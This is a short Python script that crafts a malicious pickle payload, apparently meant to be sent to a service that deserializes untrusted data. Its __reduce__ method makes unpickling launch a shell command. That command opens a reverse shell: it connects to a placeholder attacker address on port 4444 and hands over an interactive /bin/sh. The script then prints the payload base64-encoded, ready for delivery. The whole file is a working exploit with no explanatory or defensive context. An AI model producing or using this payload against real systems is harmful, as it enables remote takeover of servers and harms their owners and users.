#!/usr/bin/env python

import os
import subprocess
import pickle
import base64

IP = 'XXX.XXX.XXX.XXX'
PORT = 4444

class Exploit(object):
  def __reduce__(self):
    return (subprocess.Popen, (
      ("""python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("%s",%d));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' &""" % (IP, PORT)),
      0, # Bufsize
      None, # exec
      None, #stdin
      None, #stdout
      None, #stderr
      None, #preexec
      False, #close_fds
      True, # shell
      ))

print base64.b64encode(pickle.dumps(Exploit()))
